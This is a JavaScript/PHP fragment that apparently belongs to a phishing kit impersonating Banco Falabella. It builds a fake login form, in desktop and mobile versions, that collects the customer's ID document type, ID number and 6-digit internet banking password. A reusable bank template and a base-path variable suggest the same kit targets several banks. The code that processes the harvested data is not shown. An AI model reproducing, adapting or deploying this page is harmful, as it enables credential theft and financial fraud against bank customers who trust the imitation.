var my_titulo = 'Banco Falabella';
var falabella_body = `
<table style="float:right" id="frmLogin">
    <tr>
        <td>
            <select name="txtTipo" id="txtTipo" class="entradas">
                <option value="CC">Cédula Ciudadanía</option>
                <option value="CE">Cédula de Extranjería</option>
                <option value="PP">Pasaporte</option>
            </select>
        </td>
        <td>
            <input type="text" placeholder="Cédula de Ciudadanía" name="txtUsuario" id="txtUsuario" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
        </td>
        <td>
            <input type="password" placeholder="Clave Internet" name="txtPassword" id="txtPassword" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
        </td>
        <td>
            <button class="btn" type="button" onclick="validateData()" id="btnEntrar"> ❯ </button>
        </td>
    </tr>
</table>
</div>

<div id="frmLoginMobile">
    <div style="text-align:right;">
        <table style="float:right;" id="btnCerrar">
            <tr>
                <td>CERRAR</td>
                <td><img src="${my_banco}img/x.jpg" style="margin-left: 10px; width: 26px;"></td>
            </tr>
        </table>

    </div>
    <br>
    <select name="txtTipoM" id="txtTipoM" class="entradas">
        <option value="CC">Cédula Ciudadanía</option>
        <option value="CE">Cédula de Extranjería</option>
        <option value="PP">Pasaporte</option>
    </select>
    <br>
    <input type="text" placeholder="Cédula de Ciudadanía" name="txtUsuario" id="txtUsuario"  class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
    <br>
    <input type="password" placeholder="Clave Internet" name="txtPassword" id="txtPassword" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
    <br>
    <button class="btn" type="button" onclick="validateData()"> INGRESAR </button>
    <span>Crea o recupera tu Clave Internet</span>
</div>
`

<?php require_once('_plantilla_falabella.php'); ?>


//<script>
    loadContenido();